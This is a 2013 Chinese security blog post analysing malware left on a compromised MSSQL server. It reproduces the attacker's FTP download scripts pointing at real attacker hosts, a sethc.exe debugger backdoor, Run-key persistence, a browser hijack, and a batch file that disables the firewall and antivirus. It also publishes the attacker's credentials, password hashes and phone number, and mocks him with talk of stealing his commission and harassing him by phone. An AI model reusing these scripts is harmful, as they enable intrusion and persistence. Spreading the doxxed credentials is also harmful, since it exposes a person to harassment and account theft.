@@ -1,0 +1,2709 @@
+<!DOCTYPE html>
+<html lang="zh-cn" itemscope itemtype="http://schema.org/WebPage">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title>服务器被入侵之后，反爆1433抓鸡黑客菊花，并公布大量黑阔账号密码 - Nuclear&#39;Atk（核攻击）网络安全实验室</title>
+  
+
+<meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta name="MobileOptimized" content="width"/>
+<meta name="HandheldFriendly" content="true"/>
+
+
+<meta name="applicable-device" content="pc,mobile">
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+<meta name="mobile-web-app-capable" content="yes">
+
+<meta name="author" content="Nuclear&#39;Atk" /><meta name="description" content="服务器被入侵之后，反爆1433抓鸡黑客菊花，并公布大量黑阔账号密码。今天早上，一朋友叫帮忙看看，说某业务服务器不稳定，频繁死机重启。于是进服务器看了看，不看不知道，一看吓一跳，发现一大堆木马、后门、垃圾软件（已全部打包）……然后挨个清理，彻底检查一番后，做了简单的分析，同时爆了此抓鸡黑客的菊花……清理过程就不说了，被入侵的原因是，mssql数据库密码没改，一直闲置没用，大约在2013-3-8日晚22:10:00左右，有抓鸡黑客扫1433扫到了……然后传了一大堆木马，垃圾软件，放了什么挂机赚钱的软件（真你妈有才），还改IE浏览器首页为推广地址（我了个去），详细见底下……清理完毕后，将清理的文件全部打包，拿来分析，然后呢，嘿嘿……经过简单的分析后，收集到此抓鸡黑客各种账号密码、FTP、GoTop佣金账号、电话号码、QQ，完爆此黑客菊花……当然，事情不会就此打住，谁让你动的是核总朋友的服务器呢？还他妈的装了一堆木马、后门、垃圾软件，把服务器搞的混乱不堪……" />
+<meta name="keywords" content="服务器被入侵之后，反爆1433抓鸡黑客菊花，并公布大量黑阔账号密码" />
+
+
+
+<meta name="baidu-site-verification" content="GSIJv096Bu" />
+
+
+
+<meta name="generator" content="Hugo 0.82.0" />
+
+
+<link rel="canonical" href="https://lcx.cc/post/3371/" />
+
+
+
+
+
+<link rel="icon" href="/favicon.ico" />
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/sass/jane.min.af20b78e95c84de86b00a0242a4a77bd2601700e1b250edf27537d957ac0041d.css" integrity="sha256-ryC3jpXITehrAKAkKkp3vSYBcA4bJQ7fJ1N9lXrABB0=" media="screen" crossorigin="anonymous">
+
+
+
+
+
+<meta property="og:title" content="服务器被入侵之后，反爆1433抓鸡黑客菊花，并公布大量黑阔账号密码" />
+<meta property="og:description" content="服务器被入侵之后，反爆1433抓鸡黑客菊花，并公布大量黑阔账号密码。今天早上，一朋友叫帮忙看看，说某业务服务器不稳定，频繁死机重启。于是进服务器看了看，不看不知道，一看吓一跳，发现一大堆木马、后门、垃圾软件（已全部打包）……然后挨个清理，彻底检查一番后，做了简单的分析，同时爆了此抓鸡黑客的菊花……清理过程就不说了，被入侵的原因是，mssql数据库密码没改，一直闲置没用，大约在2013-3-8日晚22:10:00左右，有抓鸡黑客扫1433扫到了……然后传了一大堆木马，垃圾软件，放了什么挂机赚钱的软件（真你妈有才），还改IE浏览器首页为推广地址（我了个去），详细见底下……清理完毕后，将清理的文件全部打包，拿来分析，然后呢，嘿嘿……经过简单的分析后，收集到此抓鸡黑客各种账号密码、FTP、GoTop佣金账号、电话号码、QQ，完爆此黑客菊花……当然，事情不会就此打住，谁让你动的是核总朋友的服务器呢？还他妈的装了一堆木马、后门、垃圾软件，把服务器搞的混乱不堪……" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://lcx.cc/post/3371/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2013-03-14T16:48:17&#43;08:00" />
+<meta property="article:modified_time" content="2013-03-16T08:39:49&#43;08:00" />
+
+<meta itemprop="name" content="服务器被入侵之后，反爆1433抓鸡黑客菊花，并公布大量黑阔账号密码">
+<meta itemprop="description" content="服务器被入侵之后，反爆1433抓鸡黑客菊花，并公布大量黑阔账号密码。今天早上，一朋友叫帮忙看看，说某业务服务器不稳定，频繁死机重启。于是进服务器看了看，不看不知道，一看吓一跳，发现一大堆木马、后门、垃圾软件（已全部打包）……然后挨个清理，彻底检查一番后，做了简单的分析，同时爆了此抓鸡黑客的菊花……清理过程就不说了，被入侵的原因是，mssql数据库密码没改，一直闲置没用，大约在2013-3-8日晚22:10:00左右，有抓鸡黑客扫1433扫到了……然后传了一大堆木马，垃圾软件，放了什么挂机赚钱的软件（真你妈有才），还改IE浏览器首页为推广地址（我了个去），详细见底下……清理完毕后，将清理的文件全部打包，拿来分析，然后呢，嘿嘿……经过简单的分析后，收集到此抓鸡黑客各种账号密码、FTP、GoTop佣金账号、电话号码、QQ，完爆此黑客菊花……当然，事情不会就此打住，谁让你动的是核总朋友的服务器呢？还他妈的装了一堆木马、后门、垃圾软件，把服务器搞的混乱不堪……"><meta itemprop="datePublished" content="2013-03-14T16:48:17&#43;08:00" />
+<meta itemprop="dateModified" content="2013-03-16T08:39:49&#43;08:00" />
+<meta itemprop="wordCount" content="11878">
+<meta itemprop="keywords" content="爆,服务,服务器,黑客,菊,密码,入侵,账号,360,app,bug,Cmd,cookie,CSS,Dos,exe,EXP,FTP,Html,HTTP,IE,IP,js,MAC,Microsoft,Net,QQ,Rat,Shell,SQL,URL,VB,VBS,Web,Windows,程序,电信,分析,管理,后门,劫持,警方,垃圾,浏览器,木马,批处理,软件,数据,文件,系统," /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="服务器被入侵之后，反爆1433抓鸡黑客菊花，并公布大量黑阔账号密码"/>
+<meta name="twitter:description" content="服务器被入侵之后，反爆1433抓鸡黑客菊花，并公布大量黑阔账号密码。今天早上，一朋友叫帮忙看看，说某业务服务器不稳定，频繁死机重启。于是进服务器看了看，不看不知道，一看吓一跳，发现一大堆木马、后门、垃圾软件（已全部打包）……然后挨个清理，彻底检查一番后，做了简单的分析，同时爆了此抓鸡黑客的菊花……清理过程就不说了，被入侵的原因是，mssql数据库密码没改，一直闲置没用，大约在2013-3-8日晚22:10:00左右，有抓鸡黑客扫1433扫到了……然后传了一大堆木马，垃圾软件，放了什么挂机赚钱的软件（真你妈有才），还改IE浏览器首页为推广地址（我了个去），详细见底下……清理完毕后，将清理的文件全部打包，拿来分析，然后呢，嘿嘿……经过简单的分析后，收集到此抓鸡黑客各种账号密码、FTP、GoTop佣金账号、电话号码、QQ，完爆此黑客菊花……当然，事情不会就此打住，谁让你动的是核总朋友的服务器呢？还他妈的装了一堆木马、后门、垃圾软件，把服务器搞的混乱不堪……"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+
+
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">Nuclear'Atk</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/">主页</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/post/">归档</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/tags/">标签</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/categories/">分类</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/">友链</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%85%B3%E4%BA%8E/">关于</a>
+          
+        
+      </li>
+    
+
+    
+  </ul>
+</nav>
+
+
+  
+    
+
+
+
+
+
+
+  <link rel="stylesheet" href="/lib/photoswipe/photoswipe.min.css" />
+  <link rel="stylesheet" href="/lib/photoswipe/default-skin/default-skin.min.css" />
+
+
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+<div class="pswp__bg"></div>
+
+<div class="pswp__scroll-wrap">
+    
+    <div class="pswp__container">
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+    </div>
+    
+    <div class="pswp__ui pswp__ui--hidden">
+    <div class="pswp__top-bar">
+      
+      <div class="pswp__counter"></div>
+      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+      <button class="pswp__button pswp__button--share" title="Share"></button>
+      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+      
+      
+      <div class="pswp__preloader">
+        <div class="pswp__preloader__icn">
+          <div class="pswp__preloader__cut">
+            <div class="pswp__preloader__donut"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+      <div class="pswp__share-tooltip"></div>
+    </div>
+    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+    </button>
+    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+    </button>
+    <div class="pswp__caption">
+      <div class="pswp__caption__center"></div>
+    </div>
+    </div>
+    </div>
+</div>
+
+  
+
+  
+
+  
+
+  <header id="header" class="header container">
+    <div class="logo-wrapper">
+  <a href="/" class="logo">
+    
+      Nuclear'Atk
+    
+  </a>
+</div>
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/">主页</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/post/">归档</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/tags/">标签</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/categories/">分类</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/">友链</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%85%B3%E4%BA%8E/">关于</a>
+          
+
+        
+
+      </li>
+    
+
+    
+    
+
+    
+  </ul>
+</nav>
+
+  </header>
+
+  <div id="mobile-panel">
+    <main id="main" class="main bg-llight">
+      <div class="content-wrapper">
+        <div id="content" class="content container">
+          <article class="post bg-white">
+    
+    <header class="post-header">
+      <h1 class="post-title">服务器被入侵之后，反爆1433抓鸡黑客菊花，并公布大量黑阔账号密码</h1>
+      
+      <div class="post-meta">
+        <time datetime="2013-03-14" class="post-time">
+          2013-03-14
+        </time>
+        <div class="post-category">
+            <a href="https://lcx.cc/categories/%E8%80%81%E7%B3%BB%E7%BB%9F%E5%86%85%E5%AE%B9/"> 老系统内容 </a>
+            <a href="https://lcx.cc/categories/%E7%88%86/"> 爆 </a>
+            <a href="https://lcx.cc/categories/%E6%9C%8D%E5%8A%A1/"> 服务 </a>
+            <a href="https://lcx.cc/categories/%E6%9C%8D%E5%8A%A1%E5%99%A8/"> 服务器 </a>
+            <a href="https://lcx.cc/categories/%E9%BB%91%E5%AE%A2/"> 黑客 </a>
+            <a href="https://lcx.cc/categories/%E8%8F%8A/"> 菊 </a>
+            <a href="https://lcx.cc/categories/%E5%AF%86%E7%A0%81/"> 密码 </a>
+            <a href="https://lcx.cc/categories/%E5%85%A5%E4%BE%B5/"> 入侵 </a>
+            <a href="https://lcx.cc/categories/%E8%B4%A6%E5%8F%B7/"> 账号 </a>
+            
+          </div>
+        <span class="more-meta"> 约 11878 字 </span>
+          <span class="more-meta"> 预计阅读 24 分钟 </span>
+
+        
+        
+
+        
+        
+      </div>
+    </header>
+
+    
+    
+<div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">文章目录</h2>
+  <div class="post-toc-content">
+    
+  </div>
+</div>
+
+    
+    <div class="post-content">
+      
+<p>
+	<strong><span style="color:#E53333;">2013-3-16 8:22:20 补充：</span></strong> 
+</p>
+<p style="text-indent:2em;">
+	各位朋友说的很好：赠人玫瑰，手有余香；得饶人处且饶人；没有必要把人逼到死路，毁了年轻人一辈子。
+</p>
+<p style="text-indent:2em;">
+	此事就此打住吧，公开资料教训一下就行了，真把他弄进去了不太好，他可能要坐几年牢，可能毁了这年轻人的一辈子……
+</p>
+<p style="text-indent:2em;">
+	至于公开的账号、密码等资料，纯属此人留在服务器上的文件提取出来的，我只是公开这些木马文件而已，你既然做了这些事情，你就应该意识到迟早有这一天，即使不是我公布，也可能是其他人公布，谁叫你没有保护资料的意识呢，各种密码居然留在木马、程序文件中……
+</p>
+<p style="text-indent:2em;">
+	不过，放心吧，警方暂时不会找你的。
+</p>
+<p style="text-indent:2em;">
+	此事完结，各位道友，就别再搞那家伙了。。
+</p>
+<hr />
+<p>
+	<strong><span style="color:#E53333;">2013-3-15 9:22:44 补充：</span></strong> 
+</p>
+<p style="text-indent:2em;">
+	今晨突然想起来一些细节，在经过思考之后，我觉得这么专业的抓鸡黑客，应该不是植入一两台机器这么简单，应该是夜以继日的使用服务器疯狂扫描全球IP段，并且大规模植入服务器，我感觉到事态的严重性！
+</p>
+<p style="text-indent:2em;">
+	于是，在24小时之后，也就是半小时之前，我进行了第二次深入追查，<strong><span style="color:#E53333;">挖掘抓鸡黑客姓名、邮箱、支付宝身份信息，惊现大规模僵尸网络，掌握大量证据，强烈要求中国警方介入处理！</span></strong> 
+</p>
+<p style="text-indent:2em;">
+	具体细节见此文：“<a href="https://lcx.cc/post/3372/" target="_blank">追查黑客姓名,邮箱,支付宝信息，惊现大规模僵尸网络，要求警方介入处理！</a>”
+</p>
+<hr />
+<p style="text-indent:2em;">
+	今天早上，一朋友叫帮忙看看，说某业务服务器不稳定，频繁死机重启。
+</p>
+<p style="text-indent:2em;">
+	于是进服务器看了看，不看不知道，一看吓一跳，发现一大堆木马、后门、垃圾软件（已全部打包）……
+</p>
+<p style="text-indent:2em;">
+	然后挨个清理，彻底检查一番后，做了简单的分析，同时爆了此抓鸡黑客的菊花……
+</p>
+<p style="text-indent:2em;">
+	清理过程就不说了，被入侵的原因是，mssql数据库密码没改，一直闲置没用，大约在2013-3-8日晚22:10:00左右，有抓鸡黑客扫1433扫到了……
+</p>
+<p style="text-indent:2em;">
+	然后传了一大堆木马，垃圾软件，放了什么挂机赚钱的软件（真你妈有才），还改IE浏览器首页为推广地址（我了个去），详细见底下……
+</p>
+<p style="text-indent:2em;">
+	清理完毕后，将清理的文件全部打包，拿来分析，然后呢，嘿嘿……
+</p>
+<p style="text-indent:2em;">
+	经过简单的分析后，收集到此抓鸡黑客各种账号密码、FTP、GoTop佣金账号、电话号码、QQ，完爆此黑客菊花……
+</p>
+<p style="text-indent:2em;">
+	当然，事情不会就此打住，谁让你动的是核总朋友的服务器呢？还他妈的装了一堆木马、后门、垃圾软件，把服务器搞的混乱不堪……
+</p>
+<p style="text-indent:2em;">
+	现在把所有收集到的资料原封不动的公开，让所有读者都可以践踏你的菊花，爆到你菊花残……
+</p>
+<p style="text-indent:2em;">
+	这样是不是有点不人道呢？括弧笑
+</p>
+<p style="text-indent:2em;">
+	谁让你碰到核上将了呢……括弧笑
+</p>
+<p style="text-indent:2em;">
+	药药，切克闹！！！！！！！！！！！
+</p>
+<p style="text-indent:2em;">
+	打包文件下载地址：<a href="http://pan.baidu.com/share/link?shareid=332787&uk=771752861" target="_blank">http://pan.baidu.com/share/link?shareid=332787&amp;uk=771752861</a> 
+</p>
+<p style="text-indent:2em;">
+	<span style="color:#E53333;"><strong>警告：压缩包内文件均为木马病毒，如果您不是专业人士，且勿尝试执行任何文件！否则后果自负！！！</strong></span> 
+</p>
+<p style="text-indent:2em;">
+	解压密码：<a href="https://lcx.cc/" target="_blank">lcx.cc</a> 
+</p>
+<p style="text-indent:2em;">
+	以下是简单记录：
+</p>
+<pre class="prettyprint">/*----------------------------------------------------------------------------*/
+
+[ftp]
+yofee.9966.org
+122.224.8.148
+浙江省绍兴市 电信IDC机房
+账号：123，密码：123
+ftp://123:123@yofee.9966.org/1433.exe
+ftp://123:123@yofee.9966.org/1433pp.exe
+
+[web7b]
+username=zinet
+password=f6e8bf6d651553f3
+用户名：zinet，密码：f6e8bf6d651553f3，密码明文：13005520499（手机号）
+
+[www.gotop.org]
+[AccountDetail]
+userId=474989
+wd5=b24c94aaf674145093b30afa5b760094
+[deploy]
+IsAutoLogin=true
+IsHideUi=false
+language=CHS
+speed=High
+IsNotHomeUi=true
+
+[ftp]
+ftp: rar.393114.net
+user: qice.cn
+password: 360
+账号：qice.cn，密码：360
+名称:    cie.s.3322.net
+Address:  27.17.28.142
+Aliases:  rar.393114.net
+湖北省武汉市 电信
+ftp://qice.cn:360@rar.393114.net/Autodesk.rar
+ftp://qice.cn:360@rar.393114.net/gotop.rar
+ftp://qice.cn:360@rar.393114.net/GTexe.rar
+ftp://qice.cn:360@rar.393114.net/htc.rar
+ftp://qice.cn:360@rar.393114.net/qibin.rar
+ftp://qice.cn:360@rar.393114.net/Rar.rar
+ftp://qice.cn:360@rar.393114.net/sdy.rar
+ftp://qice.cn:360@rar.393114.net/sdyexe.rar
+ftp://qice.cn:360@rar.393114.net/update.rar
+ftp://qice.cn:360@rar.393114.net/weke.rar
+
+[ftp]
+ftp: ma.393114.net
+user: 123
+password: 123
+名称:    yofee.9966.org
+Address:  122.224.8.148
+Aliases:  ma.393114.net
+浙江省绍兴市 电信IDC机房
+ftp://123:123@ma.393114.net/1433.exe
+ftp://123:123@ma.393114.net/1433pp.exe
+
+
+[ftp]
+ftp: cie.s.3322.net
+user: qice.cn
+password: 360
+名称:    cie.s.3322.net
+Address:  27.17.28.142
+湖北省武汉市 电信
+ftp://qice.cn:360@cie.s.3322.net/Autodesk.rar
+ftp://qice.cn:360@cie.s.3322.net/gotop.rar
+ftp://qice.cn:360@cie.s.3322.net/GTexe.rar
+ftp://qice.cn:360@cie.s.3322.net/htc.rar
+ftp://qice.cn:360@cie.s.3322.net/qibin.rar
+ftp://qice.cn:360@cie.s.3322.net/Rar.rar
+ftp://qice.cn:360@cie.s.3322.net/sdy.rar
+ftp://qice.cn:360@cie.s.3322.net/sdyexe.rar
+ftp://qice.cn:360@cie.s.3322.net/update.rar
+ftp://qice.cn:360@cie.s.3322.net/weke.rar
+
+[account]
+高仿超级管理员账号：Administartor，密码：6375625
+激活并修改SQL数据账号密码：SQLDebugger 6375625
+密码很有可能是黑阔的QQ号。
+
+[password]
+rar压缩包的密码：810220
+
+[url]
+IE首页推广地址：http://www.2345.com/?k1112958
+
+/*----------------------------------------------------------------------------*/</pre>
+<p style="text-indent:2em;">
+	详细记录：
+</p>
+<pre class="prettyprint">/*----------------------------------------------------------------------------*/
+
+\winpact.reg，用来设置映像劫持（sethc.exe），一个低级shift后门：
+
+Windows Registry Editor Version 5.00
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe]
+"Debugger"="C:\\WINDOWS\\srchasst\\wmpserv.dll"
+
+/*----------------------------------------------------------------------------*/
+
+\WC.DAT，一个标准CMD下FTP传马的配置文件（抓鸡常用），包含有ftp地址、账号密码：
+
+嘿嘿，悄悄地把木马换成自己的，一批一批的肉鸡哟……
+
+open yofee.9966.org
+123
+123
+binary
+get 1433.exe C:\WINDOWS\WinSxS\Policies\360pro.exe
+bye
+
+ftp：yofee.9966.org，账号：123，密码：123
+
+/*----------------------------------------------------------------------------*/
+
+\a\controll.inf，修改注册表的，功能：
+安装几个映像劫持（包含那个shift后门），
+再在run启动项安几个木马，
+然后修改IE首页地址为他的推广地址（狗血，服务器上谁用浏览器啊？）
+然后再安个系统服务形式的木马……
+
+[Version]
+Signature="$WINDOWS NT$"
+[DefaultInstall]
+AddReg=add
+DelReg=del
+[del]
+HKCU,Software\Policies\Microsoft\Windows\system
+HKLM,SOFTWARE\Microsoft\Command Processor,AutoRun
+HKLM,SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\cmd.exe
+HKLM,SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ftp.exe
+HKLM,SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\net.exe
+[add]
+HKlm,Software\Microsoft\Windows\CurrentVersion\Run,,0,"c:\Windows\system32\Brand.exe"
+HKlm,Software\Microsoft\Windows\CurrentVersion\Run,okc,0,"C:\WINDOWS\dhcp\GoTop.exe"
+HKlm,Software\Microsoft\Windows\CurrentVersion\Run,Laker,0,"C:\WINDOWS\appmgmt\bplaysvr.exe"
+HKlm,Software\Microsoft\Windows\CurrentVersion\Run,hit,0,"C:\WINDOWS\MsDtc\mscorsvw.exe"
+HKLM,SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe,Debugger,0,"C:\WINDOWS\srchasst\wmpserv.dll"
+HKCU,"Software\Microsoft\Internet Explorer\Main","Start Page",,"http://www.2345.com/?k1112958"
+HKLM,"SOFTWARE\Microsoft\Internet Explorer\Main","Start Page",,"http://www.2345.com/?k1112958"
+HKU,".DEFAULT\Software\Microsoft\Internet Explorer\Main","Start Page",,"http://www.2345.com/?k1112958"
+HKU,".DEFAULT\Software\Microsoft\Internet Explorer\Main","Search Page",,"http://www.2345.com/?k1112958"
+[DefaultInstall.Services] 
+AddService=Ati HotKey Poller,,AddService-1
+[AddService-1] 
+DisplayName=Ati HotKey Poller 
+Description=Administers and Manages ATI Server Objects.
+ServiceType=0x20 
+StartType=2 
+ErrorControl=0 
+ServiceBinary=C:\windows\system32\Ati2evxx.exe
+
+/*----------------------------------------------------------------------------*/
+
+\appmgmt\web7b.ini，\appmgmt\bplaysvr.exe 的配置文件，包含有账号、密码（MD5）：
+
+[web7b]
+username=zinet
+password=f6e8bf6d651553f3
+adslauto=1
+adslname=
+adsltype=0
+kjqd=1
+hide=1
+zexe=1276
+zt=2
+jf=47274
+ip=***.***.***.***
+rwzs=1
+type=1
+id=22774
+lj=C:\WINDOWS\appmgmt\bplaysvr.exe
+name=bplaysvr.exe
+desk=65552
+server=2
+userid=29257
+
+用户名：zinet，密码：f6e8bf6d651553f3，密码明文：13005520499，电话号码哟，亲，打过去骚扰一下抓鸡黑客。
+
+/*----------------------------------------------------------------------------*/
+
+\dhcp\GoTop.exe，这伙还装了个“挂机赚钱”类的软件，官网：http://www.gotop.org/
+
+原理很简单，挂在服务器上，自动浏览别人广告，网站，然后官方会按照相应的规则支付给你佣金。
+
+具体介绍去看：http://www.gotop.org/download.php?language=0
+
+这家伙挺有才的，挂在服务器上，设置为隐藏，每天二十四小时都在刷广告、流量，大批量植入的话，估计佣金不少。
+
+官网宣称此软件极其稳定，但实际上极其不稳定，经常把服务器搞死机、重启。。。。
+
+/*----------------------------------------------------------------------------*/
+
+\dhcp\etc\config.ini，嘿嘿，GoTop.exe的配置文件，此抓鸡黑客的账号密码哟。。。
+
+哟西！先把佣金转走再说。。。。。药药，切克闹！！！
+
+[AccountDetail]
+userId=474989
+wd5=b24c94aaf674145093b30afa5b760094
+[deploy]
+IsAutoLogin=true
+IsHideUi=false
+language=CHS
+speed=High
+IsNotHomeUi=true
+
+/*----------------------------------------------------------------------------*/
+
+\logs\*，各种配置文件哟，亲，收集一大批抓鸡黑阔的FTP、账号、密码哟……
+
+++++++++++++++++++++++++++++++++++++++++
+\logs\config.ini
+++++++++++++++++++++++++++++++++++++++++
+[AccountDetail]
+userId=474989
+wd5=b24c94aaf674145093b30afa5b760094
+[deploy]
+IsAutoLogin=true
+IsHideUi=false
+language=CHS
+speed=High
+IsNotHomeUi=true
+
+
+++++++++++++++++++++++++++++++++++++++++
+\logs\GT.ini
+++++++++++++++++++++++++++++++++++++++++
+open rar.393114.net
+qice.cn
+360
+binary
+get gotop.rar C:\WINDOWS\WinSxS\InstallTemp\gotop.rar
+bye
+
+
+++++++++++++++++++++++++++++++++++++++++
+\logs\GTexe.ini
+++++++++++++++++++++++++++++++++++++++++
+open rar.393114.net
+qice.cn
+360
+binary
+get GTexe.rar C:\WINDOWS\WinSxS\InstallTemp\GTexe.rar
+bye
+
+
+++++++++++++++++++++++++++++++++++++++++
+\logs\htc.ini
+++++++++++++++++++++++++++++++++++++++++
+open rar.393114.net
+qice.cn
+360
+binary
+get htc.rar C:\WINDOWS\srchasst\wmpserv.dll
+bye
+
+
+++++++++++++++++++++++++++++++++++++++++
+\logs\ma.ini
+++++++++++++++++++++++++++++++++++++++++
+open ma.393114.net
+123
+123
+binary
+get 1433.exe C:\WINDOWS\WinSxS\Policies\360pro.exe
+bye
+
+
+++++++++++++++++++++++++++++++++++++++++
+\logs\qb.ini
+++++++++++++++++++++++++++++++++++++++++
+open rar.393114.net
+qice.cn
+360
+binary
+get qibin.rar C:\WINDOWS\WinSxS\InstallTemp\qibin.rar
+bye
+
+
+++++++++++++++++++++++++++++++++++++++++
+\logs\rar.ini
+++++++++++++++++++++++++++++++++++++++++
+open rar.393114.net
+qice.cn
+360
+binary
+get rar.rar C:\WINDOWS\system32\locatar.exe
+bye
+
+
+++++++++++++++++++++++++++++++++++++++++
+\logs\sdy.ini
+++++++++++++++++++++++++++++++++++++++++
+open cie.s.3322.net
+qice.cn
+360
+binary
+get sdy.rar C:\WINDOWS\WinSxS\InstallTemp\sdy.rar
+bye
+
+
+++++++++++++++++++++++++++++++++++++++++
+\logs\sdyexe.ini
+++++++++++++++++++++++++++++++++++++++++
+open cie.s.3322.net
+qice.cn
+360
+binary
+get sdyexe.rar C:\WINDOWS\WinSxS\InstallTemp\sdyexe.rar
+bye
+
+
+++++++++++++++++++++++++++++++++++++++++
+\logs\update.ini
+++++++++++++++++++++++++++++++++++++++++
+open rar.393114.net
+qice.cn
+360
+binary
+get update.rar C:\WINDOWS\WinSxS\InstallTemp\update.rar
+bye
+
+
+++++++++++++++++++++++++++++++++++++++++
+\logs\weke.ini
+++++++++++++++++++++++++++++++++++++++++
+open rar.393114.net
+qice.cn
+360
+binary
+get weke.rar C:\WINDOWS\WinSxS\InstallTemp\weke.rar
+bye
+
+----------------------------------------
+userId=474989
+wd5=b24c94aaf674145093b30afa5b760094
+
+ftp: rar.393114.net
+user: qice.cn
+password: 360
+
+ftp: ma.393114.net
+user: 123
+password: 123
+
+ftp: cie.s.3322.net
+user: qice.cn
+password: 360
+----------------------------------------
+
+/*----------------------------------------------------------------------------*/
+
+\Network\Network.bat，一个批处理，高度集成模块化的垃圾软件安装程序，流程如下：
+
+先是关掉系统自带的防火墙，然后复制配置文件 config.ini 到系统指定目录。
+
+然后删除一堆启动项，有360、nod32等防护软件……
+
+然后干掉一堆进程（推测是之前传木马残留的进程？），然后删掉这些进程对应的文件。
+
+然后运行木马，再用ftp下载一堆木马……
+
+然后再安装下下来的文件，再ftp下载一堆……
+
+以此类推数次后（服务器被装了一堆垃圾软件就是这么来的），然后安装镜像劫持的shift后门（见上边的注册表文件）
+
+然后再添加一个超级管理员账号：Administartor，密码为：6375625，嘿嘿，我会告诉你密码很有可能是黑阔的QQ号么？
+
+注意这个账号，Administ【ar】tor，而正确的应该是：Administ【ra】tor
+
+丫把“ra”颠倒了一下，创建了一个迷惑人的高仿账号（不得不说，这方法很傻逼），可惜只能迷惑一下不懂电脑的管理员……
+
+然后再下载东西，再安装，再解压一个rar文件到指定目录……
+
+很好，这里我们又得到一个密码：810220，rar压缩包的密码，见 \InstallTemp\ 下的压缩包。
+
+C:\WINDOWS\system32\wins\net stop sharedaccess
+copy C:\WINDOWS\system32\logs\config.ini C:\WINDOWS\dhcp\etc\config.ini /y
+reg delete HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\run /v "360safe" /f
+reg delete HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\run /v "aoc" /f
+reg delete HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\run /v "laker" /f
+reg delete HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\run /v "okc" /f
+reg delete HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\run /v "hit" /f
+reg delete HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\run /v "shell" /f
+reg delete HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\run /v "estnod32" /f
+reg delete HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\run /v "fstnod32" /f
+reg delete HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\run /v "gstnod32" /f
